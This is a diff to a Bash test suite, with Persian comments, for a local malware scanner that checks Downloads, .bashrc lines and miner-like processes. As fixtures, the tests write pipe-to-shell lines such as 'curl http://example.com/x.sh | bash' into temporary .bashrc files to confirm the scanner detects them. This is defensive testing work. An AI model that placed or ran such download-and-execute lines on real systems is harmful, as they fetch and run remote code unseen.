@@ -90,8 +90,16 @@ rm -rf "$TMP_HOME_1"
 echo ""
 echo "-- تست ۳: تشخیص فایل اجرایی اخیر در Downloads --"
 TMP_HOME_2="$(mktemp -d)"
-mkdir -p "$TMP_HOME_2/Downloads"
-echo "echo test" > "$TMP_HOME_2/Downloads/suspicious.sh"
+# Match the scanner's platform-specific Downloads path.
+if [ -n "${TERMUX_VERSION:-}" ] || [ -d "/data/data/com.termux" ]; then
+    TEST_DOWNLOADS="$TMP_HOME_2/storage/downloads"
+else
+    TEST_DOWNLOADS="$TMP_HOME_2/Downloads"
+fi
+mkdir -p "$TEST_DOWNLOADS"
+printf '%s\n' '#!/bin/sh' 'echo test' > "$TEST_DOWNLOADS/suspicious.sh"
+chmod +x "$TEST_DOWNLOADS/suspicious.sh"
+touch "$TEST_DOWNLOADS/suspicious.sh"
 OUT_2="$(HOME="$TMP_HOME_2" bash "$TARGET_SCRIPT" 2>&1)"
 EXIT_2=$?
 assert_true "کد خروجی صفر است" "$EXIT_2"
@@ -108,7 +116,7 @@ echo 'curl http://example.com/x.sh | bash' > "$TMP_HOME_3/.bashrc"
 OUT_3="$(HOME="$TMP_HOME_3" bash "$TARGET_SCRIPT" 2>&1)"
 EXIT_3=$?
 assert_true "کد خروجی صفر است" "$EXIT_3"
-assert_contains "خط مشکوک در bashrc پرچم خورد" "$OUT_3" "خط مشکوک"
+assert_contains "خط مشکوک در bashrc پرچم خورد" "$OUT_3" "مشکوک"
 rm -rf "$TMP_HOME_3"
 
 ###############################################################################
@@ -171,8 +179,10 @@ rm -rf "$TMP_HOME_6"
 echo ""
 echo "-- تست ۸: اجرا با PATH محدود (بدون ابزارهای جانبی) --"
 TMP_HOME_7="$(mktemp -d)"
-MINIMAL_PATH="/usr/bin:/bin"
-OUT_7="$(HOME="$TMP_HOME_7" PATH="$MINIMAL_PATH" bash "$TARGET_SCRIPT" 2>&1)"
+BASH_BIN="$(command -v bash)"
+BASH_DIR="$(dirname "$BASH_BIN")"
+MINIMAL_PATH="$BASH_DIR:/usr/bin:/bin"
+OUT_7="$(HOME="$TMP_HOME_7" PATH="$MINIMAL_PATH" "$BASH_BIN" "$TARGET_SCRIPT" 2>&1)"
 EXIT_7=$?
 assert_true "با PATH محدود هم کرش نمی‌کند" "$EXIT_7"
 rm -rf "$TMP_HOME_7"
@@ -214,6 +224,57 @@ HOME="$TMP_HOME_8" bash "$TARGET_SCRIPT" >/dev/null 2>&1
 CHECKSUM_AFTER="$(sha256sum "$TMP_HOME_8/Downloads/keepme.txt" | awk '{print $1}')"
 assert_eq "فایل کاربر دست‌نخورده باقی مانده" "$CHECKSUM_BEFORE" "$CHECKSUM_AFTER"
 rm -rf "$TMP_HOME_8"
+
+###############################################################################
+# تست ۱۱: lesspipe/dircolors در rc نباید false positive شوند
+###############################################################################
+echo ""
+echo "-- تست ۱۱: rc helperهای شناخته‌شده --"
+TMP_HOME_9="$(mktemp -d)"
+cat > "$TMP_HOME_9/.bashrc" <<'EOF'
+[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+EOF
+OUT_9="$(HOME="$TMP_HOME_9" bash "$TARGET_SCRIPT" 2>&1)"
+assert_true "rc helperهای سالم باعث کرش نمی‌شوند" "$?"
+if printf '%s' "$OUT_9" | grep -q "الگوی اجرای/دانلود مشکوک"; then
+    echo "  ✗ FAIL: lesspipe/dircolors false positive شدند"
+    FAIL=$((FAIL+1))
+else
+    echo "  ✓ PASS: lesspipe/dircolors false positive نشدند"
+    PASS=$((PASS+1))
+fi
+rm -rf "$TMP_HOME_9"
+
+###############################################################################
+# تست ۱۲: نام عمومی miner به‌تنهایی نباید تهدید تلقی شود
+###############################################################################
+echo ""
+echo "-- تست ۱۲: جلوگیری از false positive نام عمومی --"
+if grep -Fq 'if [ "$score" -ge 4 ]; then' "$TARGET_SCRIPT"; then
+    echo "  ✓ PASS: پردازش‌ها با امتیاز زمینه‌ای ارزیابی می‌شوند"
+    PASS=$((PASS+1))
+else
+    echo "  ✗ FAIL: امتیازدهی زمینه‌ای برای پردازش‌ها پیدا نشد"
+    FAIL=$((FAIL+1))
+fi
+
+###############################################################################
+# تست ۱۳: الگوی دانلود و اجرای shell باید تشخیص داده شود
+###############################################################################
+echo ""
+echo "-- تست ۱۳: تشخیص زنجیره دانلود/اجرا --"
+TMP_HOME_10="$(mktemp -d)"
+echo 'curl https://example.com/a.sh | bash' > "$TMP_HOME_10/.bashrc"
+OUT_10="$(HOME="$TMP_HOME_10" bash "$TARGET_SCRIPT" 2>&1)"
+if printf '%s' "$OUT_10" | grep -q "مشکوک"; then
+    echo "  ✓ PASS: زنجیره دانلود/اجرا شناسایی شد"
+    PASS=$((PASS+1))
+else
+    echo "  ✗ FAIL: زنجیره دانلود/اجرا شناسایی نشد"
+    FAIL=$((FAIL+1))
+fi
+rm -rf "$TMP_HOME_10"
 
 ###############################################################################
 # خلاصه
